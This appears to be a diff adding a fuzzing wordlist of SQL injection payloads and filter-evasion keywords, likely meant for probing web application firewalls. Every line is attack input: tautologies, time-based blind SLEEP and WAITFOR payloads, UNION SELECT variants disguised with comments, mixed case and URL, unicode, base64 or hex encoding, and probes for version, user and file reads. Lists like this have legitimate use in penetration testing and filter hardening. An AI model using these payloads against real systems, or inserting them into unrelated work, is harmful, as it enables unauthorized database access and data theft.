@@ -1,0 +1,148 @@
+' or 2=2--
+(1)or(1)=(1)
+1 AND %EF%BC%871%EF%BC%87=%EF%BC%871
+1 AND %00%271%00%27=%00%271
+1 AND 1=1%00
+MScgQU5EIFNMRUVQKDUpIw==
+1 AND A NOT BETWEEN 0 AND B--
+1 AND A BETWEEN B AND B--
+SELECT%09id FROM%09users WHERE%09id LIKE 1
+%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545
+%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45
+%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045
+LIMIT 3 OFFSET 2
+MID(VERSION() FROM 1 FOR 1)
+CONCAT_WS(MID(CHAR(0),0,0),1,2)
+SELECT * FROM users WHERE id LIKE 1
+1\\\\" AND SLEEP(5)#
+1 AND GREATEST(A,B+1)=A
+/*!0UNION/*!0ALL/*!0SELECT
+1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;
+IF(ISNULL(1),2,1)
+SELECT table_name FROM INFORMATION_SCHEMA/**/.TABLES
+select table_name from
+1 /*!30874AND 2>1*/--
+1 /*!00000AND 2>1*/--
+1    UNION     SELECT   foobar
+1 UNIOUNIONN SELESELECTCT 2--
+SELECT%C0%AAFIELD%C0%AAFROM%C0%AATABLE%C0%AAWHERE%C0%AA2%C0%BE1
+%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E
+SELECT CONCAT(CHAR(113),CHAR(114),CHAR(115)) FROM DUAL
+SelEcT table_name FrOm
+I/**/N/**/SERT
+1 AND 1=1 and '0having'='0having'
+SELECT/**/id/**/FROM/**/users
+1—nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227
+1%23nVNaVoPYeva%0AAND%23ngNvzqu%0A9227=9227
+1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227
+SELECT%0Eid%0DFROM%07users
+1%23%0AAND%23%0A9227=9227
+SELECT%0Bid%0DFROM%0Cusers
+1--%0AAND--%0A9227=9227
+SELECT+id+FROM+users
+SELECT%0Did%0DFROM%0Ausers
+1 AND 9227=9227-- 
+1 %26%26 '1'='1
+-1 UNION SELECT
+1%bf%27-- 
+1/*!UNION*//*!ALL*/
+and 'a'='a'
+and 1
+or 1
+and 1=1
+and 2<3
+and 'a'<>'b'
+and 3<=2
+and 5<=>4
+and 5<=>5
+and 5 is null
+or 5 is not null
+123<234
+9928!=1239
+abc'
+abc"
+or
+and
+''
+'abc'
+abc' --
+=
+>=
+<=
+between
+like
+order
+by
+ORDER/**/BY
+having
+||
+&&
+#
+/*
+union
+uNioN
+uN/**/ioN
+select
+seLeCt
+seL/**/eCt
+union select
+union/**/select
+uNion(sElect)
+union all select
+union/**/all/**/select
+uNion all(sElect)
+insert
+values
+update
+delete
+waitfor()
+waitfor
+sleep(2)
+WAITFOR DELAY
+benchmark()
+information_schema
+table_name
+column_name
+if
+else
+IF() select
+case()
+limit
+char()
+cast()
+convert()
+isnull()
+substring()
+concat()
+hex()
+unhex()
+avg()
+count()
+min()
+sum()
+JOIN
+@@version
+user
+drop
+load_file()
+extractvalue()
+0x633A5C626F6F742E696E69
+%55nion(%53elect 1,2,3)
+uni%0bon+se%0blect
+REVERSE(noinu) REVERSE(tceles)
+/*--*/union/*--*/select/*--*/
+union distinct select
+niOn distiNct sElect
+<!--
+information_schema.tables
+information_schema.columns
+user()
+system_user()
+information_schema.schemata
+table_schema
+offset
+distinct
+@@hostname
+@@datadir
+version()
+exec()
